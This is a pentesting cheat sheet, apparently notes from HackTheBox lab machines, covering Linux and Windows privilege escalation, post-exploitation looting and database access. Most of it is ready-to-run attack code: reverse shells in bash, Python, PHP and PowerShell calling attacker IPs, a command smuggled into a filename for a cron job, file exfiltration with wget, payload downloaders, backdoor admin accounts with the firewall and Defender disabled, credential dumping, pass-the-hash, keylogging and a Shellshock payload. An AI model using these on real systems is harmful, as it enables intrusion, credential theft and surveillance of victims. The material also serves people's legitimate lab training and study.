You can try this technique when an argument is passed by value and you can modify the param "value". If a "cronjob" run this script "test.sh" each 1 min, the way for exploit this is the next:

```text
test.sh:
nohup /bin/rm -f $path$value

Inside of "path" directory create a "file" with this name:
touch -- ";nc -c bash 10.10.14.39 4321"

And wait for the "cronjob" run.
```

#### RedHat / CentOS

If you OS is a RedHat or CentOS, you can try found a "network-scripts":

```text
# Search for "network-scripts" that the current user can run like root:
sudo -l

# Run this file like root:
sudo -u root [file_script]

# In the assignament of INTERCACE_NAME, PROXY_METHOD, BROWSER_ONLY, etc. you can insert the command that you want:
interface NAME:
[cgonzalo bash]
interface PROXY_METHOD:
[...]
[...]
[...]
Then you won the shell like root.

Reference: See "Networked" box (htb)
```

#### GTFObins

```text
    #################
    ### Systemctl ###
    #################

# If you run

find / -perm -4000 2>/dev/null
sudo -l

# And the response is

...
/bin/systemctl
...

# You can try exploit this creating a service

# Create the service "/dev/shm/root.service", in "/home/user/" or "/your/path"

...................................
echo '[Unit]
Description=cgonzalo

[Service]
ExecStart=/bin/nc 10.10.14.31 9555 -e /bin/bash

[Install]
WantedBy=multi-user.target' > cgonzalo.service
...................................

# Create symlink to service

systemctl link /home/pepper/cgonzalo.service

# Enable service

systemctl enable --now /home/pepper/cgonzalo.service

Take you revShell.

Reference: jarvis box (htb)



    ############
    ### nmap ###
    ############

# If you run

find / -perm -4000 2>/dev/null
sudo -l

# And the response is

...
/usr/bin/nmap
...

# You can try exploit this with GTFObins for nmap

sudo /usr/bin/nmap --interactive
nmap> !sh

https://gtfobins.github.io/gtfobins/nmap/

Reference: beep box (htb)



    ############
    ### tmux ###
    ############

# If you realize

ps aux

# And found one session tmux running like "root", you can try

tmux -S /path/of/session

# If you run 

find / -perm -4000 2>/dev/null
sudo -l

# Try https://gtfobins.github.io/gtfobins/tmux/

sudo tmux



    ###############
    ### sysinfo ###
    ###############    

# If you run

find / -perm -4000 2>/dev/null
sudo -l

# And the response is

...
/bin/sysinfo
...

# You need know how this work and the CVE reported (https://labs.f-secure.com/advisories/magnicomps-sysinfo-root-setuid-local-privilege-escalation-vulnerability/)

# Description

MagniComp's SysInfo enables system administrators to find and view highly detailed system, software, and hardware information on a variety of platforms.

# Impact

This vulnerability allows local users to gain root privilege and hence full control over the affected system.

# You need to know

This process work with a tool called "lshw" (https://www.linuxadictos.com/lshw-obten-informacion-del-hardware-gnulinux.html)

# We can exploit this creating a fake LSHW file and run it with a payload

1) See the section "Hardware Info" from "sysinfo" process and choose one for exploit

user@user:# sysinfo

===Hardware Info===
lshw -short

===Disk Info===
fdisk -l

===CPU Info===
cat /proc/cpuinfo 


2) cat lshw (machine ATTACKER)

    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.40",9444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

3) /tmp/cgonzalo:$ wget http://<ip_attacker>:<port>/lshw

4) /tmp/cgonzalo:$ chmod +x lshw

5) /tmp/cgonzalo:$ export PATH=/tmp/cgonzalo:$PATH export PATH=/tmp/cgonzalo:$PATH

6) nc -lnvp 9444 (Set a listener in attacker machine)

7) Run "sysinfo" in victim box

8) Got root

Reference: magic box (htb)



    ############
    ### wget ###
    ############

# If you run

find / -perm -4000 2>/dev/null
sudo -l

# And the response is

...
/usr/bin/wget
(root) NOPASSWD: /usr/bin/wget
...

# You can try get a FILE from the server victim

# Before, set your LISTENER with NETCAT

nc -lnvp 80

# Get the file

sudo wget --post-file /root/root.txt http://10.10.14.7/

wget --post-file=$LFILE $URL

sudo wget --post-file </path/of/file> <your-server>

# Get a Reverse Shell

- See the reference of Sunday box (htb) from overwriting of binary and pfexec privilege escalation

Resource: https://www.youtube.com/watch?v=eMnxB92BmFw



    ###########
    ### tar ###
    ###########

# If you run

find / -perm -4000 2>/dev/null
sudo -l

# And the response is

...
/usr/bin/tar
(<user>) NOPASSWD: /bin/tar
...

# You can do

sudo -u <user> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Reference: tartarSauce box (htb)



    ###############
    ### apt-get ###
    ###############

- This approach work if you have access to FTP & TFTP in this case. This should work anyway.

# If you see a Cronjob like this

*/5 *    * * *    root    apt update 2>&1 >/var/log/apt/custom.log

# You can exploit this

1) cd /dev/shm
2) echo 'APT::Update::Pre-Invoke {"/bin/cp /root/root.txt /dev/shm/flag; chmod 755 /dev/shm/flag"};' > 100update
3) tftp 192.168.0.1
4) tftp> put 100update /etc/apt/apt.conf.d/100update
5) tftp> q
6) ftp 192.168.0.1 
7) ftp> cd /dev/shm
8) ftp> get flag
9) ftp> bye

NOTA: You can get a SSH connection

10) cd /root/.ssh/
11) ssh-keygen
12) echo 'APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};' > 10update
13) tftp 192.168.0.1
14) tftp> put id_rsa.pub /root/.ssh/authorized_keys
15) tftp> put 10update /etc/apt/apt.conf.d/10update
16) tftp> q
17) ssh root@192.168.0.1

Reference: inception box (htb)
Resource:
    https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/
    https://gtfobins.github.io/gtfobins/apt/


    ##############
    ### Docker ###
    ##############

# If you run "groups" and "docker images" for the current user and see:

luffy@cache:~$ groups
luffy docker

luffy@cache:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        9 months ago        64.2MB

# You can try exploit this GTFObins

1) luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh

# whoami
root

Reference: cache box (htb)
Resource: https://gtfobins.github.io/gtfobins/docker/
```

#### chkrootkit

```text
- If you see a file called "report" this is a vulnerability of "chkrootkit"

# Search the exploit

searchsploit chkrootkit

Chkrootkit 0.49 - Local Privilege Escalation

# Create a file in "/tmp" (victim machine) with your reverse shell

php -r '$sock = fsockopen("10.10.14.4",1337); exec("/bin/sh -i <&3 >&3 2>&3");'

# Set your listener

nc -lnvp 1337

# Wait for the crontab to run and get revShell
```

#### WildCards

```text
- This technique is useful with CHOWN, CHMOD, TAR and RSYNC

# If you have a cronjob that change the permissions of a file, maybe this is vulnerable to injection of wildcards

=============
=== CHOWN ===
=============

1) Create a file with the current user

touch cgonzalo

2) Wait a few minutes for the permissions change in the file and create this reference of command "chown" to other file with root permissions

touch -- --reference=<file_with_root_permissions>

3) Download this shell

https://github.com/0xCGonzalo/g0ld/blob/master/Shells/setuid.c

4) Compile this

gcc shell.c -o shell 

5) Put this shell of suid in the path victim

6) Change permissions

chmod u+s shell 

7) Wait a few minutes and execute your shell and get root

Reference: joker & shrek box (htb)
Resource: https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
```

#### Debian OpenSSL Predictable PRNG

```text
- All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

==============
=== Attack ===
==============

# You should be verify if the key SSH is vulnerable

# Compared to the keys generated in the date 2006-May 13th, 2008. Get the fingerprint of the key

ssh-keygen -l -f <id_rsa>.pub -E md5

# Reformatted

ssh-keygen -l -f <id_rsa>.pub -E md5 | cut -d: -f2- | cut -d' ' -f1 | tr -d ':'

root@kali:/opt/debian-ssh/uncommon_keys# ls rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6*

INCOMPLETE:
    ¡¡¡STUDY THIS TECHNIQUE!!!

This video explain well this attack: https://www.youtube.com/watch?v=Rtkgrz02plI

Reference: flujab box (htb)
Resource: https://github.com/g0tmi1k/debian-ssh
```

#### Slack Space

```text
=========================
=== Hide Data in File ===
=========================

echo "I'm hiding this and you cannot easily see it" | bmap --mode putslack <file>.txt

=======================
=== See Data Hidden ===
=======================

bmap --mode slack <file>.txt --verbose

Reference: chainsaw box (htb)
Resource: https://techcyberz.wordpress.com/2014/01/30/hiding-data-slack-space-on-linux/
```

#### NodeJS npm

```text
#################################
### Look the strange behavior ###
#################################

-  The idea is that a NodeJS package is defined in a file "package.json"

========================
=== If you look this ===
========================

algernon@holiday:/# sudo -l
User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *

======================================================================
=== Can be exploited creating a file "package.json" in a directory ===
======================================================================

algernon@holiday:/dev/shm/cgonzalo$ cat package.json 
{
  "name": "root_please",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}

================
=== Run this ===
=================

algernon@holiday:/dev/shm/cgonzalo$ cd ..            
algernon@holiday:/dev/shm$ sudo /usr/bin/npm i cgonzalo/ --unsafe
root@holiday:/

Reference: holiday box (htb)
Resource: https://github.com/joaojeronimo/rimrafall
```

#### SUDO

```text
####################
### User to Root ###
####################
    =============================
    === Sudo version < 1.8.28 ===
    =============================

# If you have the credential of current user and run:

sudo -l

# And see:

    Matching Defaults entries for hugo on blunder:
            env_reset, mail_badpass,
           secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User hugo may run the following commands on blunder:
          (ALL, !root) /bin/bash

# You can exploit this with the next command and get root:

hugo@blunder:/$ sudo -u#-1 /bin/bash


Reference: blunder box (htb)
Resource: 
    https://www.exploit-db.com/exploits/47502
    https://n0w4n.nl/sudo-security-bypass/
```

#### lxc / lxd

```text
#################
### lxc & lxd ###
#################

Privilege escalation through lxd requires the access of local account, therefore, we choose SSH to connect and take the access local account on host machine.

Note: the most important condition is that the user should be a member of lxd group.

    =================
    === Detecting ===
    =================

# If you run "id" and see "xxx (lxd)", you can exploit this:

ash@ash:# id
uid=1001(ash) gid=1001(ash) groups=1001(users), 116 (lxd)

ash@ash:# groups
users lxd

    ==================
    === Exploiting ===
    ==================

In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:

- Steps to be performed on the attacker machine:

    01. Download build-alpine in your local machine through the git repository.
    02. Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.    
    03. Transfer the tar file to the host machine    

- Steps to be performed on the host machine:

    01. Download the alpine image
    02. Import image for lxd
    03. Initialize the image inside a new container.
    04. Mount the container inside the /root directory

# Attacker Machine:

cgonzalo@cgonzalo:# git clone  https://github.com/saghul/lxd-alpine-builder.git
cgonzalo@cgonzalo:# cd lxd-alpine-builder
cgonzalo@cgonzalo:# ./build-alpine
cgonzalo@cgonzalo:# python -m SimpleHTTPServer 1338

# Victim Machine:

ash@ash:# mkdir tmp
ash@ash:# cd /tmp
ash@ash:# wget http://<ip>:<port>/apline-v3.10-x86_64-20191008_1227.tar.gz

ash@ash:# lxc image import ./alpine-v3.12-x86_64-20200630_1321.tar.gz --alias <myAlias>
ash@ash:# lxd init
ash@ash:# lxc init <myAlias> ignite -c security.privileged=true
ash@ash:# lxc list
ash@ash:# lxc config device add ignite <myDevice> disk source=/ path=/mnt/root recursive=true
ash@ash:# lxc start ignite
ash@ash:# lxc exec ignite /bin/sh
# whoami

Once inside the container, navigate to /mnt/root to see all resources from the host machine.

# cd /mnt/root/

Reference: tabby box (htb)
Resource: https://www.hackingarticles.in/lxd-privilege-escalation/
```

### Windows

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

* Kernel exploits
* Cleartext password
* Reconfigure service parameters
* Inside service
* Program running as root
* Installed software
* Scheduled tasks
* Weak passwords

#### Basic info

```text
systeminfo
set
hostname
hostname -I
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php

whoami /priv

dir/a -> Show hidden & unhidden files
dir /Q -> Show permissions
```

#### Kernel exploits

```text
# Look for hotfixes, if this is "Hotfix(s): N/A", you can find vulnerabilities about OS Version and OS Name
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```

#### Cleartext passwords

```text
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Reconfigure service parameters

* Unquoted service paths
* Weak service permissions

[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

#### Dump process for passwords

```text
# Looking for Firefox
Get-Process
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```

#### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```text
# Meterpreter
run get_local_subnets

netstat /a
netstat -ano
```

#### Programs running as root/system

#### Installed software

```text
# Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```

#### Scheduled tasks

```text
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

#### Weak passwords

Remote desktop

```text
ncrack -vv --user george -P /root/oscp/passwords.txt rdp://10.11.1.111
```

#### Add user and enable RDP

```text
# Add new user

net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Turn firewall off and enable RDP

sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

#### Powershell sudo for Windows

**Powershell Method 1**

```text
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy Bypass -File xyz.ps1
```

**Powershell Method 2**

We can change from USER\_01 to another USER\_02 knowing the "username" and "password" of the second.

Use with SMB Server:

```text
$username = '10.10.10.167\hector'
$password = 'l33th4x0rhector'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ScriptBlock {\10.10.14.41\share\nc.exe 10.10.14.41 1234 -e c:\windows\system32\cmd.exe} -Credential $credential -computer localhost

Invoke-Command -ScriptBlock {whoami} -Credential $credential -computer localhost
```

Use with WGET command:

```text
$username = '10.10.10.167\hector'
$password = 'l33th4x0rhector'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ScriptBlock {wget http://10.10.14.41:1234/nc.exe -O C:\windows\system32\spool\drivers\color\nc.exe} -Credential $credential -computer localhost
Invoke-Command -ScriptBlock {C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.41 444 -e C:\windows\system32\cmd.exe} -Credential $credential -computer localhost
```

#### Windows download with bitsadmin

```text
bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker10.11.1.111>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```

#### Windows download with certutil.exe

```text
certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat
```

#### Windows download with powershell

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"

(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
```

#### Windows Download from FTP

```text
# In reverse shell
echo open 10.11.1.111 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```

#### Windows create SMB Server transfer files

```bash
# Attack machine
python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111"

    # Or SMB service 
    # http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
    vim /etc/samba/smb.conf
        [global]
        workgroup = WORKGROUP
        server string = Samba Server %v
        netbios name = indishell-lab
        security = user
        map to guest = bad user
        name resolve order = bcast host
        dns proxy = no
        bind interfaces only = yes

        [ica]
        path = /var/www/html/pub
        writable = no
        guest ok = yes
        guest only = yes
        read only = yes
        directory mode = 0555
        force user = nobody

    chmod -R 777 smb_path
    chown -R nobody:nobody smb_path
    service smbd restart 

# Victim machine with reverse shell
Download: copy \\10.11.1.111\Lab\wce.exe . 
Upload: copy wtf.jpg \\10.11.1.111\Lab
```

#### Windows download with VBS

```text
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.11.1.111/file.exe file.exe
```

#### Windowss XP SP1 PrivEsc

```bash
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

#### Pass The Hash

```text
# Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
rhosts => 10.10.0.100

msf5 exploit(windows/smb/psexec) > set smbuser admin2

smbuser => admin2

msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

smbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp
```

#### Scripts

**Useradd**

```text
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c
```

**Powershell Run As**

```text
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```

**Powershell Reverse Shell**

```text
Set-ExecutionPolicy Bypass

$client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Powershell Non-interactive Execute Powershell File

```text
# Powershell (Non-interactive execute powershell file) 
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

#### Windows privesc/enum tools

* [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)
* [Watson](https://github.com/rasta-mouse/Watson)

  ```text
  Compile WATSON (with VisualStudio e.g.) and run it against vicim machine.
  ```

  **Windows precompiled exploits**

* [WindowsExploits](https://github.com/abatchy17/WindowsExploits)

#### Windows Port Forwarding

Run in victim \(5985 WinRM\):

`plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221`

#### Windows DnsAdmins and Explotation of DLL

```text
# Run this

whoami /groups

# If you see like some this:

Group Name        Type
DOMAIN\DnsAdmins    Alias

# Then this is VULNERABLE. (See "Control" box from HTB for referencies)
```

#### See Users and Objects Eliminated From AD

If you have a User with permissions for this operation, you can see USERS and OBJECTS eliminated from AD \(Active Directory\):

```text
 Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $True' -Property *
```

#### Dump Passwords Hashes from Active Directory

```text
# Dump hashes (domain-controller or ip of victim)

python secretsdump.py -dc-ip <ip> <domain/user@domain_controller>

# Run wmiexec.py with the HASH located

python wmiexec.py -hashes '<hashUser> '<User>@<ip>'

Resource: https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633
```

#### Azure AD

```text
- Azure ActiveDirectory presents many ways for get privilege escalation

# If you run

whoami /all

# And see that your user is Azure Admin

Group Name                                  Type             SID                                          Attributes 
=========================================== ================ ============================================ ==================================================
<DOMAIN>\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group

# You can try dump credentials with "AzureAD Connect.ps1"

1) Download the module to own machine:

- wget https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1

2) Download the module in the victim machine:

- python -m SimpleHTTPServer 1234 (attacker machine)
- powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.7:1234/Azure-ADConnect.ps1','C:\Users\mhope\Desktop\azure.ps1')" (victim machine)

3) Export this module

- import-module ./<your_module.ps1>
- import-module ./Azure-ADConnect.ps1   

4) Run the command for extract credentials

- <your_module> -server <ip_victim> -db <db_name>      
- Azure-ADConnect -server 127.0.0.1 -db ADSync      


Reference:
- monteverde box (htb)
- https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1
- https://github.com/DeanCefola/PowerShell-Scripts/blob/master/Azure%20AD/AzureAD%20Connect.ps1


# More info about privilege escalation with AZURE: 
- https://blog.xpnsec.com/azuread-connect-for-redteam/
- https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a
```

## **Loot**

### Linux

**Checklist**

* Proof:
* Network secret:
* Passwords and hashes:
* Dualhomed:
* Tcpdump:
* Interesting files:
* Databases:
* SSH-keys:
* Browser:
* Mail:

#### Proof

```text
echo -e '\n'HOSTNAME:   && hostname && echo -e '\n'WHOAMI:   && whoami && echo -e '\n'PROOF:  && cat proof.txt && echo -e '\n'IFCONFIG:  && /sbin/ifconfig && echo -e '\n'PASSWD:  && cat /etc/passwd && echo -e '\n'SHADOW:  && cat /etc/shadow && echo -e '\n'NETSTAT:  && netstat -antup
```

#### Network secret

```text
/root/network-secret.txt
```

#### Passwords and hashes

```text
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

john <file_cracked> --show
```

#### Dualhomed

```text
ifconfig
ifconfig -a
arp -a
```

#### Tcpdump

```text
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
```

#### Interesting files

```text
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
use auxiliary/sniffer/psnuffle

.ssh:
.bash_history
```

#### Databases

#### SSH-Keys

#### Browser

#### Mail

```text
# Directory of mails

/var/mail
/var/spool/mail

# See a mail of user

cat /var/mail/<user>
```

#### GUI

If there is a gui we want to check out the browser.

```text
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

#### ShellShock

If you find a "cgi-bin" and some file executable, you should be test this:

```text
curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" http://10.10.10.56/cgi-bin/user.sh

Tips:
. Sometimes it is necessary to use double or triple "echo".
. Sometimes it is necessary to put the absolute path of the command that is invoked
```

#### Grep

When you want run more than seach of string, you can run "egrep" like:

```text
egrep -i ‘(string1|string2|...|stringN)’ [FILE_NAME]
```

### Windows

#### Proof

```text
hostname && whoami.exe && type proof.txt && ipconfig /all
```

#### Passwords and hashes

```text
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

#### Dualhomed

```text
ipconfig /all
route print

# What other machines have been connected
arp -a
```

#### Tcpdump

```text
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

#### Interesting files

```text
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

#### VNC Crack Server Encrypted Password

```text
# We can find a file called "VNC Install.reg" maybe. We can crack this with the next tool:

vncpwd.exe [PASSWORD_FOR_CRACK]

https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/

# (LINUX) VNC Passwords in a file are stored obfuscated, but they can be broken. Use this one, running the python and using -d for decrypt, and -f secret to point it at our file

python /opt/vncpasswd.py/vncpasswd.py -d -f <file_encrypted>

https://github.com/trinitronx/vncpasswd.py
```

#### Decompile Binaries

```text
# We can decompile binaries files with dnSpy:

https://github.com/0xd4d/dnSpy/
```

#### CMD Hijacking

```text
########################################
### RCE in CME (Not a vulnerability) ###
########################################

cmd.exe /c "ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe"

Reference: https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/
```

## **Data Bases Tips**

### SQLite3

```text
# We can open a file "SQLite 3.x database" with:

sqlite3 [file.db]

# List the DB:

.databases

# Open a DB:

.open [Path_Of_DB]

# See Tables:

.tables

# Select All of an Object:

select * from [TABLE];
```

### MySQL Dump

```text
# If you have credentials for MySQL DB, you can try dump information

mysqldump -A -u <dbUsername> --password=<dbPassword> -X
```

### Mongo DB

```text
- One "collection" is similar to "tables" in other DB

# Connect to DB

mongo -u <DBuser> -p <DBpassword> <DBname>

# List all collections

> show collections

# See information of a collection

> db.<collection>.find()

# Insert inside of collection, in a field, your code

db.<collection>.insertOne({<field>: "<your_code>"});

Reference: node box (htb)
```

# **Web**

# SSL and TLS

- [ ] **Tools**

- testssl


- [ ] **Uso del Protocolo Débil SSLv3**

Este protocolo está obsoleto. Existen vulnerabilidades públicas que permiten a un atacante descifrar las comunicaciones entre el cliente y el servidor.

```
OpenSSL> s_client -ssl3 -proxy 127.0.0.1:8080 -connect <server_victim>
```

- [ ] **POODLE**

